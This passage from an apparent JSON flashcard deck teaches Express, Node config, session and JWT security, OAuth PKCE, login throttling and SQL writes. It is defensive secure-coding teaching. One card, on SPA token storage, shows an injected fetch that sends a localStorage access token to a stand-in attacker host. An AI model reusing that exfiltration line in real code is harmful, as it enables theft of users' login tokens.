+    "example": "```js\n// tasks.routes.js\nconst router = express.Router();\nrouter.get('/', (req, res) => res.json({ baseUrl: req.baseUrl }));\nrouter.get('/:id', (req, res) => res.json({ id: req.params.id }));\nexport default router;\n\n// app.js\napp.use('/api/tasks', router);\n// GET /api/tasks   -> {\"baseUrl\":\"/api/tasks\"}\n// GET /api/tasks/5 -> {\"id\":\"5\"}\n// GET /tasks       -> 404\n```\nThe router never mentions `/api/tasks`, so you can move or version it by changing one line in `app.js`.",
+    "analogy": "A router is a department with its own internal room numbers. Room 5 inside the Tasks department is reached from the lobby as \"Tasks, room 5\"; the department never needs to know which floor it is on.",
+    "mistake": "Repeating the prefix inside the router, as in `router.get('/api/tasks/:id')` mounted at `/api/tasks`. That route now only answers /api/tasks/api/tasks/5, and the real URL returns 404.",
+    "check": "A comments router is mounted with `app.use('/api/tasks/:taskId/comments', commentsRouter)`. Inside its handlers, `req.params.taskId` is undefined. What fixes this?",
+    "answer": "**Create the router with `express.Router({ mergeParams: true })`.** By default a router only sees params from its own paths, not from the mount path. With `mergeParams`, GET /api/tasks/5/comments gives `req.params.taskId === '5'` (still a string)."
+  },
+  {
+    "key": "app-node-env-file",
+    "deck": 7002,
+    "title": "Load config with node --env-file",
+    "aliases": [
+      ".env",
+      "process.env",
+      "dotenv"
+    ],
+    "question": "How does `node --env-file=.env server.js` load configuration in Node 22, and what type is every value you read from `process.env`?",
+    "plain": "Node 22 reads the `KEY=value` lines of the file into `process.env` before your code runs, so a small app needs no `dotenv` package. A variable already set in the shell wins over the file. A missing file stops Node with an error; `--env-file-if-exists` (Node 22.9+) makes it optional. Every value is a string (or `undefined` when absent), so convert and validate numbers and flags at startup. Keep `.env` out of Git.",
+    "example": "```bash\n$ cat .env\nPORT=3000\nDATABASE_URL=postgres://localhost/tasks\n\n$ node --env-file=.env -e \"console.log(typeof process.env.PORT)\"\nstring\n$ node -e \"console.log(process.env.DATABASE_URL)\"\nundefined\n$ PORT=8080 node --env-file=.env -e \"console.log(process.env.PORT)\"\n8080\n```\nWithout the flag the file is ignored, and a value already exported in the shell overrides the file.",
+    "analogy": "The `.env` file is a sticky note of settings you hand to Node at the door. Node copies it into its notebook, but anything already written in the notebook by the shell stays as it was, and every entry is written as text.",
+    "mistake": "Reading `process.env.X` all over the codebase. A typo or missing variable then shows up as `undefined` deep inside a request. Read and check all settings once in a `config.js` at startup and exit with a clear message if something required is missing.",
+    "check": "A `.env` file contains `PORT=3000`. The server, started with `node --env-file=.env server.js`, computes `process.env.PORT + 1`. What is the result, and what should the code do instead?",
+    "answer": "**The string `\"30001\"`.** Environment values are always strings, so `+` concatenates. Convert first: `const port = Number(process.env.PORT ?? 3000)` gives the number 3000, and `port + 1` is 3001. Check `Number.isInteger(port)` at startup."
+  },
+  {
+    "key": "app-express-status-json",
+    "deck": 7002,
+    "title": "Send a status and a body together",
+    "aliases": [
+      "res.status",
+      "res.json",
+      "res.sendStatus"
+    ],
+    "question": "In Express 5, what do `res.status(201).json(task)` and `res.sendStatus(204)` each send, and why does `res.status(404)` on its own leave the client waiting?",
+    "plain": "`res.status(code)` only records the status code and returns `res` so you can chain; it sends nothing. `.json(task)` serialises the object, sets `Content-Type: application/json`, and ends the response. `res.sendStatus(code)` sets the code and ends the response too, with the reason phrase as a text body (`Not Found`), or no body for 204. A bare `res.status(404)` never ends, so the request stays pending. Express 5 also throws if the code is not an integer from 100 to 999.",
+    "example": "```js\napp.post('/tasks', (req, res) => {\n  const task = { id: 8, title: req.body.title };\n  res.status(201).location('/tasks/8').json(task);\n}); // 201, Location: /tasks/8, {\"id\":8,\"title\":\"Buy milk\"}\n\napp.delete('/tasks/:id', (req, res) => {\n  res.sendStatus(204);\n}); // 204, empty body, no Content-Type\n\n// res.status('201') throws a TypeError in Express 5: codes must be integers\n```\nOnly the calls that end the response (`json`, `send`, `sendStatus`, `end`) actually send anything.",
+    "analogy": "`res.status` is writing the grade on an envelope; `json` or `sendStatus` is putting the letter in and posting it. An envelope with a grade but never posted leaves the recipient checking the mailbox indefinitely.",
+    "mistake": "Passing a status that came from somewhere else as a string, such as `res.status(err.code)` where `code` is `'23505'` or `'ENOENT'`. Express 5 throws a TypeError for any non-integer status, so the error handler itself fails. Map error codes to real HTTP numbers such as 409 or 404.",
+    "check": "A DELETE /tasks/:id handler ends with `res.status(204).json({ deleted: true })`. What body does the client receive, and what is the clearer line to write?",
+    "answer": "**An empty body.** A 204 No Content response cannot carry a body, so the JSON is dropped. Write `res.sendStatus(204)` (or `res.status(204).end()`). If the client needs data back, use 200 with a JSON body instead."
+  },
+  {
+    "key": "app-express-validate-body",
+    "deck": 7002,
+    "title": "Validate req.body before saving",
+    "aliases": [
+      "input validation",
+      "400 Bad Request"
+    ],
+    "question": "An Express POST /tasks handler receives `req.body` from any client. What should it check before saving a task, and what should it send back when the title is invalid?",
+    "plain": "Treat `req.body` as untrusted: it can be missing, an array, or have the wrong types. Check each field's type first, then normalise (trim) and check limits. On failure, `return` a 400 with a message per field so the form can show it. Build the saved object from the fields you accept, not by spreading `req.body`, so extras like `isAdmin` are ignored. Libraries such as zod do this with less code.",
+    "example": "```js\napp.post('/tasks', (req, res) => {\n  const raw = req.body?.title;\n  const title = typeof raw === 'string' ? raw.trim() : '';\n  if (!title || title.length > 80) {\n    return res.status(400).json({ errors: { title: 'Enter 1-80 characters' } });\n  }\n  const task = { id: nextId++, title, done: false }; // only allowed fields\n  tasks.push(task);\n  res.status(201).json(task);\n});\n```\n`{\"title\":\"  Buy milk \"}` gives 201 with `\"Buy milk\"`; `\"   \"`, `42`, `{}` and `[]` all give 400; `{\"title\":\"x\",\"isAdmin\":true}` saves only `title`.",
+    "analogy": "A receptionist checking a visitor form reads every box before filing it: is the name actually a name, is it too long, is anything extra scribbled in the margin? Only the boxes on the official form get copied into the records.",
+    "mistake": "Forgetting `return` before `res.status(400).json(…)`. The 400 is sent, but the handler keeps going, saves the invalid task, and then crashes with ERR_HTTP_HEADERS_SENT when it tries to send the 201.",
+    "check": "Predict the result: a POST /tasks body is `{\"title\": 42}` and the Express 5 handler starts with `if (!req.body.title.trim()) return res.status(400).json(…)`. What happens, and what check should come first?",
+    "answer": "**The handler throws `TypeError: req.body.title.trim is not a function`, so the client gets a 500, not a 400.** Express 5 forwards the thrown error to the error handler. Check `typeof title === 'string'` before calling string methods, and answer 400 for the wrong type."
+  },
+  {
+    "key": "app-auth-session-id",
+    "deck": 7003,
+    "title": "A session ID links a browser to server data",
+    "aliases": [
+      "session cookie",
+      "session store"
+    ],
+    "question": "After a user logs in with a server-side session, what does the server keep, and what does the browser actually hold?",
+    "plain": "The server keeps the facts (which user, when the session started) in a session store, keyed by a long random session ID. The browser holds only that ID, in a cookie set by a `Set-Cookie` response header, and sends it back automatically in the `Cookie` header of later requests. On each request the server looks the ID up to find the user. The ID must be unguessable: OWASP asks for at least 64 bits of randomness from a secure generator such as `crypto.randomBytes`.",
+    "example": "```js\nimport { randomBytes } from 'node:crypto';\nconst sessions = new Map(); // session ID -> { userId }\n\napp.post('/login', (req, res) => {\n  // ...after checking the email and password\n  const sid = randomBytes(32).toString('base64url');\n  sessions.set(sid, { userId: 42 });\n  res.cookie('sid', sid, { httpOnly: true, secure: true, sameSite: 'lax' });\n  res.sendStatus(204);\n});\n```\n\nIn Express 5 this sends `Set-Cookie: sid=…; Path=/; HttpOnly; Secure; SameSite=Lax` with a 43-character ID. A later `GET /me` carrying that cookie found `{ userId: 42 }`; a made-up ID got 401.",
+    "analogy": "A coat check. Your coat (the user data) stays behind the counter, and you get a numbered ticket (the session ID). The ticket works only because the attendant looks it up. If ticket numbers were easy to guess, anyone could collect your coat, which is why the ID must be long and random.",
+    "mistake": "Putting the user's identity itself in a plain cookie, such as `userId=42`. Anyone can edit their cookies in DevTools or curl and become user 43. A session cookie should carry only a random ID. Data stored directly in a cookie must at least be signed (and encrypted if private), as a JWT or signed cookie is.",
+    "check": "A teammate stores `userId=42` in a plain cookie instead of a random session ID. What can any user do, and what should the cookie hold instead?",
+    "answer": "**They can sign in as anyone.** Cookies are editable in DevTools or with curl, so changing `userId=42` to `43` makes the server trust a different user. Store only a long random session ID (at least 64 bits of entropy) and keep the user ID in the server-side session record that the ID points to."
+  },
+  {
+    "key": "app-auth-cookie-attributes",
+    "deck": 7003,
+    "title": "Set the session cookie's attributes",
+    "aliases": [
+      "HttpOnly",
+      "Secure cookie",
+      "__Host- prefix"
+    ],
+    "question": "Which attributes should a login session cookie's Set-Cookie header include, and what does each one limit?",
+    "plain": "`HttpOnly` hides the cookie from page JavaScript (`document.cookie`). `Secure` sends it only over HTTPS. `SameSite=Strict` or `Lax` limits sending it when another site starts the request. `Path=/` with no `Domain` keeps it on this exact host, not subdomains. No `Max-Age` or `Expires` makes it a session cookie that ends with the browser session. OWASP also recommends the `__Host-` name prefix, which the browser rejects unless `Secure`, `Path=/`, and no `Domain` are all present.",
+    "example": "```http\nHTTP/1.1 204 No Content\nSet-Cookie: __Host-sid=uko-oDsKAhHU…; Path=/; HttpOnly; Secure; SameSite=Lax\n```\n\nExpress 5 produced exactly this attribute list from `res.cookie('__Host-sid', sid, { path: '/', httpOnly: true, secure: true, sameSite: 'lax' })`. The DevTools Application panel's cookie list shows each attribute as a column.",
+    "analogy": "Treat the attributes as delivery rules the browser enforces for you: Secure means only over an encrypted line, HttpOnly means never handed to page scripts, SameSite means not attached when another site starts the request, and host-only means this exact host. A missing rule doesn't break login; it silently removes a protection, which is why tests still pass.",
+    "mistake": "Adding `Domain=example.com` \"so it works everywhere\". Omitting `Domain` already gives a host-only cookie; setting it widens the cookie to every subdomain, so a weaker or compromised `blog.example.com` receives the session ID too. Leave `Domain` off unless sharing across subdomains is a deliberate requirement.",
+    "check": "A session cookie set by app.example.com includes `Domain=example.com`. Which hosts receive it, and what changes if Domain is left out?",
+    "answer": "**example.com and every subdomain receive it**, such as shop.example.com and blog.example.com. Leaving `Domain` out makes a host-only cookie sent only to app.example.com, the narrow scope OWASP recommends for session IDs. The `__Host-` prefix enforces this: the browser rejects a `__Host-` cookie that has a `Domain` attribute."
+  },
+  {
+    "key": "app-auth-samesite",
+    "deck": 7003,
+    "title": "SameSite decides cross-site sending",
+    "aliases": [
+      "SameSite=Lax",
+      "SameSite=Strict",
+      "SameSite=None"
+    ],
+    "question": "What do SameSite=Strict, Lax, and None change about when the browser attaches a cookie to a request?",
+    "plain": "SameSite matters when another site starts the request. `Strict`: never sent cross-site, not even when a user follows a link to you. `Lax`: sent on top-level navigations with safe methods, such as clicking a link (GET), but not on cross-site form POSTs, fetches, or image loads. `None`: sent in all contexts, and must also be `Secure`. Browsers differ when SameSite is missing (Chrome and Edge treat it as Lax; Firefox and Safari currently do not), so OWASP says always set it, preferring Strict.",
+    "example": "```text\nRequest started on another site   Strict  Lax  None\nClick a link to you (GET)         no      yes  yes\nSubmit a form to you (POST)       no      no   yes\nfetch or image request to you     no      no   yes\n```\n\nThe rows follow MDN's and OWASP's descriptions. For `None`, a fetch must also use `credentials: 'include'`, and browsers that block third-party cookies may still withhold it.",
+    "analogy": "Ask who pressed the button. If the user is on your own site, all three values send the cookie. If another site's page causes the request, Strict stays silent, Lax speaks only for a plain link-click navigation, and None always speaks. That is why Lax blocks a hidden cross-site form POST but still lets email links arrive signed in.",
+    "mistake": "Treating SameSite=Lax as complete CSRF protection. OWASP calls it defence in depth: a GET endpoint that changes data can still be triggered by a link click, and sibling subdomains count as the same site. Keep state changes off GET and still use your framework's CSRF protection.",
+    "check": "Your session cookie is SameSite=Strict. A signed-in user taps a link to your app inside a webmail page. Why do they see the login screen, and what are the fixes?",
+    "answer": "**The first request is cross-site, so Strict withholds the cookie** and the server sees an anonymous visitor; the next click inside your site sends it again. Fixes: use `SameSite=Lax` for the session cookie (sent on top-level link navigations), or keep Strict and have the landing page re-check the session with a same-site request before showing login. OWASP prefers Strict but accepts Lax."
+  },
+  {
+    "key": "app-auth-regenerate",
+    "deck": 7003,
+    "title": "Issue a new session ID at login",
+    "aliases": [
+      "session fixation",
+      "req.session.regenerate"
+    ],
+    "question": "Why should a server issue a brand-new session ID at the moment a user logs in, instead of keeping the current one?",
+    "plain": "To stop session fixation. If the ID stays the same, an attacker who planted or learned the anonymous ID before login (on a shared computer, or via a cookie set from a sibling subdomain) holds a signed-in ID as soon as the victim logs in. A new ID makes the old one worthless. In express-session, call `req.session.regenerate()` after the password check and before storing the user ID. OWASP requires this after any privilege change, not just login.",
+    "example": "```js\napp.post('/login', async (req, res, next) => {\n  const user = await checkPassword(req.body.email, req.body.password);\n  if (!user) return res.status(401).json({ error: 'Invalid email or password' });\n  const cart = req.session.cart; // keep what the anonymous session held\n  req.session.regenerate((err) => {\n    if (err) return next(err);\n    req.session.userId = user.id;\n    req.session.cart = cart;\n    res.sendStatus(204);\n  });\n});\n```\n\nIn an express-session 1.19 test, the pre-login ID then got 401 on `GET /me` and the new cookie got 200. Without `regenerate`, the planted pre-login ID got 200.",
+    "analogy": "Changing the locks when you move into a house. The previous occupant, or anyone they gave a key to, may still hold the old key. Fitting a new lock at the moment you take ownership means only keys issued to you work.",
+    "mistake": "Calling `regenerate` and then wondering where the cart went. It starts an empty session, so anonymous-session data is gone unless you copy it across, as the example does. The opposite mistake, skipping regeneration to keep the cart, reopens session fixation.",
+    "check": "Besides login, what kind of event should also make an app issue a new session ID, and what are some examples?",
+    "answer": "**Any privilege change**, such as a password change, a permission or role change, or switching into an admin mode (OWASP's examples). The session now unlocks more, or the old credentials may be compromised, so an ID issued earlier, possibly seen by someone else, must stop working. Regenerate and destroy the old session record."
+  },
+  {
+    "key": "app-auth-logout",
+    "deck": 7003,
+    "title": "Log out by destroying the server session",
+    "aliases": [
+      "logout",
+      "session timeout"
+    ],
+    "question": "What must a logout endpoint do on the server, and why is deleting the cookie in the browser not enough?",
+    "plain": "Delete or invalidate the session record on the server, then clear the cookie. Clearing only the cookie removes this browser's copy, but anyone who copied the ID earlier (from a shared computer, a log, or malware) can keep using it, because the server still accepts it. OWASP requires server-side invalidation on logout, plus server-side idle and absolute timeouts so sessions also end when nobody clicks Log out.",
+    "example": "```js\napp.post('/logout', (req, res, next) => {\n  req.session.destroy((err) => {\n    if (err) return next(err);\n    res.clearCookie('sid'); // the name: set in express-session\n    res.sendStatus(204);\n  });\n});\n```\n\nThe test logout returned 204 with `Set-Cookie: sid=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT`. Replaying the copied `sid` cookie on `GET /me` afterwards got 401.",
+    "analogy": "Throwing away a hotel key card versus the front desk deactivating it. Discarding your card (clearing the cookie) does nothing to copies someone else made; deactivating it in the system makes every copy stop opening the door.",
+    "mistake": "A Log out button that only deletes the cookie or token on the client and never tells the server; the old ID or token stays valid. Also, `res.clearCookie` must use the same `path` and `domain` options the cookie was set with, or the browser keeps the original cookie.",
+    "check": "Users on a shared library computer never click Log out and stay signed in for days. Which server-side limits end those sessions, and roughly how long should they be?",
+    "answer": "**An idle timeout and an absolute timeout, both enforced on the server.** Idle ends a session after inactivity (OWASP cites 15–30 minutes for low-risk apps, 2–5 for high-value ones). Absolute ends it a fixed time after login regardless of activity (for example 4–8 hours for a workday app). Keep the timestamps in the session record, not in the client."
+  },
+  {
+    "key": "app-auth-jwt-readable",
+    "deck": 7003,
+    "title": "A JWT is signed, not hidden",
+    "aliases": [
+      "JSON Web Token",
+      "JWT payload"
+    ],
+    "question": "A login API returns a signed JWT. Can anyone holding it read the claims inside, and what does the signature guarantee?",
+    "plain": "Yes, anyone can read it. A signed JWT (JSON Web Token) is three base64url parts, header.payload.signature, and base64url is an encoding, not encryption. The signature, made with a server-side key that clients never see, guarantees integrity: if someone edits a claim such as `role`, verification fails. So keep secrets and private personal data out of the payload, and verify the signature before trusting any claim.",
+    "example": "```js\nconst token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwMjkwMDI2fQ.xvU6…';\nconst payload = token.split('.')[1];\nconsole.log(JSON.parse(Buffer.from(payload, 'base64url')));\n// { sub: '42', role: 'user', exp: 1790290026 }\n```\n\nNo key is needed to read it. In the same Node 22 test, swapping in a payload with `role: 'admin'` while keeping the old signature failed HMAC-SHA256 verification.",
+    "analogy": "A signed JWT is a postcard with a tamper-evident seal, not a sealed letter. Anyone who handles it can read the message; the seal only proves nobody changed the message since the sender applied it.",
+    "mistake": "Reading \"signed\" as \"private\" and putting an email address, a home address, or internal notes in the payload. Browser extensions, logs, and proxies that see the token can read them. Keep claims to IDs and short-lived facts the holder is allowed to see.",
+    "check": "Predict: a user base64url-decodes the middle part of their JWT, changes `role` from `user` to `admin`, re-encodes it, and sends it back. What does a correctly written server do?",
+    "answer": "**It rejects the token.** The signature was computed over the original header and payload, so after the edit the server's HMAC or public-key check no longer matches and the request should get 401. Reading the claims was always possible; changing them undetected is not, unless the server skips verification or accepts `alg: none`."
+  },
+  {
+    "key": "app-auth-jwt-expiry",
+    "deck": 7003,
+    "title": "JWT expiry and revocation",
+    "aliases": [
+      "refresh token",
+      "exp claim",
+      "token revocation"
+    ],
+    "question": "Why can't a server instantly log out a stateless JWT, and how do short expiry times and refresh tokens limit the damage?",
+    "plain": "A stateless JWT is accepted by checking its signature and `exp` claim, with no database lookup, so nothing on the server can say \"this one is cancelled\". A stolen token works until it expires. The common design: short-lived access tokens (minutes) plus a refresh token that the server stores and checks, so logout or a password change revokes the refresh token and the access token dies soon after. Instant revocation needs server state again, such as a denylist of token IDs (`jti`).",
+    "example": "```js\nfunction verifyClaims(claims, now = Math.floor(Date.now() / 1000)) {\n  if (typeof claims.exp !== 'number' || claims.exp <= now) return 'expired';\n  return claims;\n}\nconst now = Math.floor(Date.now() / 1000); // JWT times are in seconds\nconsole.log(verifyClaims({ sub: '42', exp: now + 15 * 60 })); // { sub: '42', exp: … }\nconsole.log(verifyClaims({ sub: '42', exp: now - 1 }));       // 'expired'\n```\n\nAfter the signature check, this `exp` test is the only built-in end a stateless token has. Libraries such as jose run it for you.",
+    "analogy": "A printed day pass versus a keycard. Once printed, a day pass can't be cancelled; the guard only checks the date, so short passes limit how long a stolen one works. The desk that prints new passes (the refresh endpoint) is where a reported pass can be refused.",
+    "mistake": "Making access tokens last a week to avoid building refresh logic. Then logout, a password change, or a banned account has no effect on tokens already issued for up to a week. Keep access tokens short and put revocable state in the refresh step or in a server session.",
+    "check": "A JWT is created with `exp: Date.now() + 15 * 60 * 1000`. How long does the token stay valid, and how should the line be written?",
+    "answer": "**Practically forever.** `exp` is a NumericDate in seconds, but `Date.now()` returns milliseconds, so read as seconds this value lands around the year 58,700. Fix: `exp: Math.floor(Date.now() / 1000) + 15 * 60`. With the jose library, `setExpirationTime('15m')` does the conversion for you."
+  },
+  {
+    "key": "app-auth-spa-token-storage",
+    "deck": 7003,
+    "title": "Where an SPA keeps its login",
+    "aliases": [
+      "localStorage token",
+      "backend for frontend",
+      "BFF"
+    ],
+    "question": "A React SPA stores its access token in localStorage. What can a single XSS bug do with it, and what does OWASP recommend instead?",
+    "plain": "Any script running on your origin, including one injected through XSS (cross-site scripting), can read localStorage and send the token to an attacker, who then uses it from their own machine until it expires. OWASP says not to keep tokens or session IDs in localStorage or sessionStorage. Prefer an `HttpOnly; Secure; SameSite` session cookie, or a backend-for-frontend (BFF): a small server that holds the OAuth tokens and gives the browser only such a cookie.",
+    "example": "```js\n// Injected script, token in localStorage: copied off the device\nfetch('https://evil.example/steal', {\n  method: 'POST',\n  body: localStorage.getItem('access_token'),\n});\n\n// Same script, HttpOnly session cookie: nothing to copy\ndocument.cookie; // the HttpOnly cookie is not in this string\n```\n\nMDN documents that `document.cookie` never includes HttpOnly cookies. The script can still send requests from the open page, so fixing the XSS remains the real defence.",
+    "analogy": "A token in localStorage is a key left under the doormat: anyone who reaches the porch (any script on your page) can take it home and use it later. An HttpOnly cookie is a key built into the lock: an intruder inside can open doors while there, but cannot carry the key away.",
+    "mistake": "Believing an HttpOnly cookie makes XSS harmless. Injected code can still call your API from the victim's open tab, and the browser attaches the cookie. HttpOnly limits the damage to that page session; it does not replace output encoding, a Content Security Policy, and CSRF protection.",
+    "check": "Your SPA and its API are served from the same domain. Should login state live in a bearer token in localStorage or an HttpOnly session cookie, and what extra protection does the cookie choice need?",
+    "answer": "**Use the HttpOnly session cookie.** With same-domain hosting the browser sends it automatically, and page scripts cannot read it, so an XSS bug cannot copy it off the device. Because the browser attaches cookies by itself, state-changing requests also need CSRF protection: SameSite plus a CSRF token or an equivalent check."
+  },
+  {
+    "key": "app-auth-oauth-pkce",
+    "deck": 7003,
+    "title": "Sign in with OAuth code flow and PKCE",
+    "aliases": [
+      "OAuth 2.0",
+      "OpenID Connect",
+      "OIDC",
+      "PKCE"
+    ],
+    "question": "Behind a 'Sign in with Google' button, what do the authorization code flow and PKCE each protect against?",
+    "plain": "The browser goes to the provider, the user signs in there, and the provider redirects back with a short-lived one-time `code`, not a token. Your app swaps the code for tokens in a direct back-channel request, which keeps tokens out of URLs and history. PKCE (Proof Key for Code Exchange) makes a stolen code useless: the app sends a hash of a random secret first and must present the secret itself to redeem the code. OpenID Connect adds an ID token saying who signed in.",
+    "example": "```js\nimport { randomBytes, createHash } from 'node:crypto';\n\nconst verifier = randomBytes(32).toString('base64url'); // secret, 43 chars\nconst challenge = createHash('sha256').update(verifier).digest('base64url');\n// 1. redirect: ...&code_challenge={challenge}&code_challenge_method=S256\n// 2. token request: code + code_verifier={verifier}\n\n// RFC 7636 test vector\ncreateHash('sha256').update('dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk').digest('base64url');\n// 'E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM'\n```\n\nNode 22 reproduced the RFC's published challenge. Someone who intercepts the code from step 1 lacks the verifier and cannot complete step 2.",
+    "analogy": "A coat check where you also choose a secret word. The ticket (code) might be seen or stolen, but the attendant (token endpoint) hands over the coat only to someone who can say the word whose fingerprint (hash) was written on the ticket when it was issued.",
+    "mistake": "Using the access token as proof of who signed in. The access token is for calling the provider's API. The OpenID Connect ID token is the sign-in proof for your app, and it must be validated (issuer, audience equal to your client ID, expiry, nonce) before you create your own session. A maintained library does these checks.",
+    "check": "A new React SPA adds 'Sign in' with an OAuth provider. Should it use the implicit flow (token returned in the redirect URL) or authorization code with PKCE, and why?",
+    "answer": "**Authorization code with PKCE.** The implicit flow puts the access token in the redirect URL, where history, logs, and Referer headers can leak it; RFC 9700 (OAuth security best practice) says not to use it, and the OAuth 2.1 draft removes it. Code plus PKCE keeps tokens out of URLs, and an intercepted code is useless without the verifier. OWASP requires it for SPAs too."
+  },
+  {
+    "key": "app-auth-login-throttle",
+    "deck": 7003,
+    "title": "Throttle login attempts",
+    "aliases": [
+      "brute force",
+      "account lockout",
+      "rate limiting"
+    ],
+    "question": "How should a login endpoint slow down password guessing without letting an attacker lock real users out for good?",
+    "plain": "Count failed attempts per account and, after a threshold, lock that account for a short, growing period (30 s, 60 s, 120 s…) rather than permanently, answering 429 Too Many Requests with `Retry-After`. OWASP ties the counter to the account, not only the IP address, because attackers rotate IPs. Add per-IP limits, a CAPTCHA after a few failures, MFA, and logging, and keep the error generic: \"Invalid email or password\".",
+    "example": "```js\nconst fails = new Map(); // email -> { count, lockedUntil }\n\nfunction checkLock(email, res) {\n  const f = fails.get(email);\n  if (!f || Date.now() >= f.lockedUntil) return false;\n  res.set('Retry-After', String(Math.ceil((f.lockedUntil - Date.now()) / 1000)));\n  res.status(429).json({ error: 'Too many attempts. Try again later.' });\n  return true;\n}\nfunction recordFailure(email) {\n  const f = fails.get(email) ?? { count: 0, lockedUntil: 0 };\n  f.count += 1;\n  if (f.count >= 5) f.lockedUntil = Date.now() + 2 ** (f.count - 5) * 30_000;\n  fails.set(email, f);\n}\n```\n\nIn an Express 5 test, attempts 1–5 got 401 and attempt 6 got 429 with `Retry-After: 30`, even with the right password; other accounts were unaffected. In production keep counters in shared storage such as Redis.",
+    "analogy": "A phone's PIN screen: after several wrong tries it makes you wait 30 seconds, then longer. Guessing stays possible in principle but becomes hopelessly slow, and the real owner is delayed, not locked out for good.",
+    "mistake": "Permanent lockout after five failures. Anyone who knows a user's email can then lock them out at will, which is a denial of service. Prefer short, growing lockouts and a recovery path; OWASP suggests letting the password-reset flow work even while an account is locked.",
+    "check": "An attacker tries the password `Summer2025!` once against each of 10,000 accounts. Why does a 5-failure per-account lockout not stop this, and what helps?",
+    "answer": "**Each account sees only one failure**, so the counter never reaches 5; this is password spraying. Add limits that span accounts: per-IP and overall failure-rate limits, alerts on spikes, CAPTCHA, MFA, and rejecting common or breached passwords at sign-up. In a test, spraying 50 accounts once each produced zero 429 responses."
+  },
+  {
+    "key": "app-sql-insert-returning",
+    "deck": 7004,
+    "title": "Get the new row back with RETURNING",
+    "aliases": [
+      "RETURNING clause"
+    ],
+    "question": "A create-task endpoint INSERTs a row whose id is generated by the database. How can it get that id back without running a second query?",
+    "plain": "Add a `RETURNING` clause: `INSERT ... RETURNING id, title` runs the insert and hands back the listed columns of the row it just wrote, in the same statement and round trip. The API can put that row straight into its 201 response. `RETURNING` also works on `UPDATE` and `DELETE`, returning the rows they changed. It is PostgreSQL syntax that SQLite 3.35+ also supports.",
+    "example": "```sql\nINSERT INTO tasks (title)\nVALUES ($1)\nRETURNING id, title;\n-- $1 = 'Buy milk'  ->  1 | Buy milk\n-- $1 = 'Call Sam'  ->  2 | Call Sam\n```\nThe result comes back like a SELECT result, so node-postgres gives it to you as `result.rows[0]`. Database defaults such as `created_at` can be listed in `RETURNING` too.",
+    "analogy": "It is like a clerk who stamps your form with its reference number and hands the stamped copy back at the counter, instead of making you queue again to ask which number you got.",
+    "mistake": "Running `SELECT MAX(id) FROM tasks` (or re-selecting by title) after the insert to find the new id. Another request can insert between your two statements, so you may return someone else's row, and titles are not unique anyway. Ask the INSERT itself with `RETURNING`.",
+    "check": "Write one PostgreSQL statement that marks task $1 as done and returns its id and title, returning no row at all if that task does not exist.",
+    "answer": "**`UPDATE tasks SET done = true WHERE id = $1 RETURNING id, title;`** When the id matches, you get the updated row back; when nothing matches, the result has zero rows, which the API can turn into a 404. No separate SELECT is needed before or after."
+  },
+  {
+    "key": "app-sql-affected-rows",
+    "deck": 7004,
+    "title": "Check how many rows a write changed",
+    "aliases": [
+      "rowCount",
+      "rows affected"
+    ],
+    "question": "An API runs UPDATE tasks SET title = $1 WHERE id = $2 AND owner_id = $3 and then always returns 200. Why can it report success for a task it never updated?",
+    "plain": "An `UPDATE` or `DELETE` whose `WHERE` matches zero rows is not an error: the database just reports 0 rows affected. If the task id doesn't exist, or belongs to another user, nothing changes and the handler still says 200. Read the affected-row count (`result.rowCount` in node-postgres, `cursor.rowcount` in Python) and return 404 when it is 0.",
+    "example": "```js\nconst result = await db.query(\n  'UPDATE tasks SET title = $1 WHERE id = $2 AND owner_id = $3',\n  [title, taskId, userId]\n);\nif (result.rowCount === 0) {\n  return res.status(404).json({ error: 'Task not found' });\n}\nres.sendStatus(204);\n```\nRun against a table where task 7 belongs to user 1 and task 8 to user 2, the same UPDATE reported 1 row for (7, user 1) and 0 rows for (8, user 1), leaving task 8 unchanged.",
+    "analogy": "Like a mail-merge that reports \"0 letters sent\" when no contact matches your filter: the job ran fine, it just did nothing, and only the count tells you so.",
+    "mistake": "Answering 403 when the count is 0. With the owner check inside the `WHERE` clause, a 0 cannot tell \"missing\" from \"someone else's\", and saying which one leaks that the id exists, so most APIs return 404 for both.",
+    "check": "A DELETE FROM notes WHERE id = $1 AND owner_id = $2 runs for an id that does not exist. Does PostgreSQL raise an error, and what should the API use to decide its response?",
+    "answer": "**No error: the DELETE succeeds and reports 0 affected rows.** The API should read that count (`rowCount` in node-postgres). 0 means nothing of this user's was deleted, so return 404, or 204 if your API deliberately treats repeated deletes as success."
+  },
+  {
+    "key": "app-sql-upsert",
+    "deck": 7004,
+    "title": "Insert or update with ON CONFLICT",
+    "aliases": [
+      "upsert",
+      "excluded"
+    ],
+    "question": "A settings endpoint must create a user's 'theme' row the first time and change it on later saves. How does ON CONFLICT DO UPDATE do this in one statement?",
+    "plain": "`INSERT ... ON CONFLICT (user_id, key) DO UPDATE SET value = excluded.value` tries the insert; if a row with the same `(user_id, key)` already exists, it updates that row instead. `excluded` is PostgreSQL's name for the row you tried to insert, so `excluded.value` is the new value. The conflict columns must match a unique constraint or unique index, and the statement is atomic, so concurrent saves cannot create a duplicate. SQLite 3.24+ accepts the same syntax.",
+    "example": "```sql\n-- user_settings has PRIMARY KEY (user_id, key)\nINSERT INTO user_settings (user_id, key, value)\nVALUES ($1, $2, $3)\nON CONFLICT (user_id, key)\nDO UPDATE SET value = excluded.value\nRETURNING user_id, key, value;\n-- (1, 'theme', 'light') -> 1 | theme | light  (inserted)\n-- (1, 'theme', 'dark')  -> 1 | theme | dark   (updated)\n```\nAfter both calls the table still holds exactly one row for that user and key.",
+    "analogy": "Like a coat check with one hook per ticket number: hand in a coat for a free ticket and it is hung up; hand one in for a ticket already in use and the attendant swaps the coat on that hook instead of adding a second hook.",
+    "mistake": "Using `ON CONFLICT DO NOTHING` and then expecting `RETURNING` to hand back the existing row. `DO NOTHING` returns no row when it skips the insert, so the handler sees an empty result and may wrongly report failure. Use `DO UPDATE`, or SELECT the row when the result is empty.",
+    "check": "Write an upsert for a page_views table (primary key path) that inserts views = 1 for a new path and adds 1 to the stored count for an existing path.",
